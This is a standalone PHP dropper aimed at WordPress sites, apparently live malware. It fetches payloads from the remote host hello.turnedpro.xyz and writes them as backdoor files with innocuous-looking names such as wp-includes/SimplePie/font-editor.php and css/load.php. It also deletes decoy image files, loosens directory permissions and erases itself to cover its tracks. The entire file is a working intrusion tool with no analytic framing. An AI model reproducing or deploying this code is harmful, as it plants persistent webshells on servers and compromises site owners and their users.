<?php
	header("Content-type:text/html;charset=utf-8");
	error_reporting(0);
	$horse_name = "postfs.php";
	$horse2_name = "votes.php";
	$config_name = "wp-config.php";
	$file_self = basename(__FILE__);
	$horse_content = get("http://hello.turnedpro.xyz/mm1.txt");
	$small_content = get("http://hello.turnedpro.xyz/mm2.txt");
	$write_contents = get("http://hello.turnedpro.xyz/contents.txt");
	
	$unlink1 =  './wp-includes/images/smilies/icon_reds.gif';
	$unlink2 =  './wp-includes/images/smilies/icon_blacks.gif';
	$unlink3 =  './wp-admin/images/align-lefts.png';
	$unlink4 =  './wp-admin/images/align-rights.png';
	@unlink($unlink1);
	@unlink($unlink2);
	@unlink($unlink3);
	@unlink($unlink4);
	//限制wp程序更新模板
	// $wpconfig = "ZGVmaW5lKCdESVNBTExPV19GSUxFX0VESVQnLCBmYWxzZSk7CmRlZmluZSgnRElTQUxMT1dfRklMRV9NT0RTJywgZmFsc2UpOw==";
	// if(file_exists($config_name)){
		// $ori_config = file_get_contents($config_name);
		// file_put_contents($config_name, $ori_config."\r\n".base64_decode($wpconfig));
	// }
	
	function get($url){ 
		$contents = @file_get_contents($url);
		if (!$contents) {
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
			$contents = curl_exec($ch);
			curl_close($ch);
		} 
		return $contents;
	}
	
	chmod(__DIR__, "0493");
	//写根目录postfs
	if(!file_exists($horse_name)){
		file_put_contents($horse_name, $horse_content);
	}
	
	//写 admin/votes 或 wp-includes/SimplePie/font-editor
	if(!is_dir("wp-content/plugins")){
		if(!is_dir("admin")){
			mkdir("admin", 0755, true);
		}else{
			chmod("admin", 0755);
		}
		file_put_contents("admin/votes.php", $horse_content);
	}else{
		file_put_contents("wp-includes/SimplePie/font-editor.php", $horse_content);
	}
	
	//写 css/load.php
	if(!is_dir("css")){
		mkdir("css", 0755, true);
	}
	file_put_contents("css/load.php", $small_content);
	

	//写 根目录contents
	file_put_contents("contents.php", $write_contents);
	
	
	//自销毁
	if(file_exists($file_self)){
		if(!unlink($file_self)){
			echo "$file_self 删除失败！<br/>";
		}else{
			echo "$file_self 删除成功！<br/>";
		}
	}
